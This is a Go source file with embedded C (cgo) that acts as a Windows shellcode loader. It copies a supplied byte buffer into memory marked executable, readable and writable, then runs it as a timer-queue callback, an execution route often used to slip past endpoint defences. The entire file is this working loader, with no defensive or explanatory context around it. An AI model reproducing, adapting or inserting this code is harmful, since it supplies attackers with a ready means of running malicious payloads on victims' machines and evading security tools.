package cloader

/*
#include <windows.h>

void createTimerQueueTimer(uintptr_t p, int len) {
    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
        HANDLE timer;
    	HANDLE queue = CreateTimerQueue();
    	HANDLE gDoneEvent = CreateEvent(0, TRUE, FALSE, 0);
    	CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)addr, NULL, 100, 0, 0);
		WaitForSingleObject(gDoneEvent, INFINITE);
    }
}
*/
import "C"
import "unsafe"

func CreateTimerQueueTimer(p []byte) {
	C.createTimerQueueTimer((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
